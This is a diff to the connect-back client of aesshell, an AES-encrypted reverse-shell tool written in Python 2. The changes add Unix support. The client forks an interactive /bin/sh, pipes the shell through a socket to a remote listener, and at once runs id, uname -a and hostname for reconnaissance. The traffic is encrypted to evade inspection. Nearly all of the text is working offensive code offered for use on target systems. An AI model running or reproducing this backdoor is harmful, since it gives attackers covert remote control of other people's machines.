@@ -1,6 +1,5 @@
 #!/usr/bin/env python2
 #
-#
 
 import os
 import sys
@@ -11,13 +10,10 @@ import subprocess
 
 import aes
 
-# removed due pyinstaller problems
-# import fcrypto as fc
-
-version = "0.3"
+version = "0.4"
 
 def usage():
-	print "aesshell v%s - using AES-CBC + HMAC-SHA256" % version
+	print "AESshell v%s - using AES-CBC + HMAC-SHA256" % version
 	print "backconnect part, use it on the system you need the shell"
 	print "spring 2015 by Marco Lux <ping@curesec.com>"
 	print
@@ -61,13 +57,25 @@ def shellWindows(decStdin):
 
 	return pStdout
 
+def shellUnix(fdr, fdw):
 
+	# fork it is
+	pid = os.fork()
+	if pid:
+		return pid
+
+	else:
+		# redirect stdin/stdout/stderr to our pipes
+		os.dup2(fdw[0],0)
+		os.dup2(fdr[1],1)
+		os.dup2(fdr[1],2) 
+
+		# execute shell
+		os.execve("/bin/sh",["sh","-i"],{})
 
 def main(rip,rport,key):
+	# list for filedescriptors and sockets to check
 	inputs = []
-
-	#initialize fernet and get back our crypto handle
-	#f = fc.initFernet()
 
 	# initialize aes class
 	ac = aes.Crypticle(key)
@@ -82,10 +90,24 @@ def main(rip,rport,key):
 	bc = s
 	cbuffer = ""
 
+	# build up some nice pipes
+	fdr = os.pipe()	
+	fdw = os.pipe()
+
+	# check the system type we are on
+	stype = os.name
+	if stype == 'posix':
+		# thanks god  - it is a unix
+		inputs.append(fdr[0])
+		chld = shellUnix(fdr, fdw)
+		os.write(fdw[1],'id\n')
+		os.write(fdw[1],'uname -a\n')
+		os.write(fdw[1],'hostname\n')
+
 	while True:
 
 		try:
-			inputs , outputs , errors = select.select(inputs,[],[])
+			inputrd , outputrd , errors = select.select(inputs,[],[])
 		except select.error, e:
 			print e
 			break
@@ -93,38 +115,64 @@ def main(rip,rport,key):
 			print e
 			break
 
-		for s in inputs:
+		for s in inputrd:
+
 			if s == bc:
 
 				try:
 					data = s.recv(1)
+					cbuffer += data
 				except socket.error, e:
 					print "Error: ", e
 					sys.exit(1)
 					
 				if data == '':
 					print "Disconnected"
+
+					# is the child process still there
+					if stype == 'posix':
+						check = os.waitpid(chld, os.P_NOWAIT)
+						if check[0] == 0:
+							os.kill(chld,9)
+
 					s.close()
 					sys.exit()
 
-				cbuffer += data
+
+			elif s == fdr[0]:
+				pStdout = os.read(fdr[0],1024)
+
+				#encrypt the data
+				encStdout = ac.dumps(pStdout)
+
+				# send data to listener
+				bc.send(encStdout)
+
 			else:
 				print "Do we ever get here?"
 
-		#decrypt data
+		# take the data and see if we can decrypt it
 		decStdin = ac.loads(cbuffer)
 
+		#decrypt data
 		if decStdin != -1:
 			cbuffer = ""
 
-			# call shell command
-			pStdout = shellWindows(decStdin)
+			if stype == 'posix':
 
-			#encrypt the data
-			encStdout = ac.dumps(pStdout)
+				# send decrypted data to shell
+				os.write(fdw[1],decStdin)
+			else:
 
-			# send data to listener
-			s.send(encStdout)
+				# call windows shell command
+				pStdout = shellWindows(decStdin)
+
+				#encrypt the data
+				encStdout = ac.dumps(pStdout)
+
+				# send data back to listener
+				s.send(encStdout)
+
 
 	s.close()
 	print "[*] Finished"
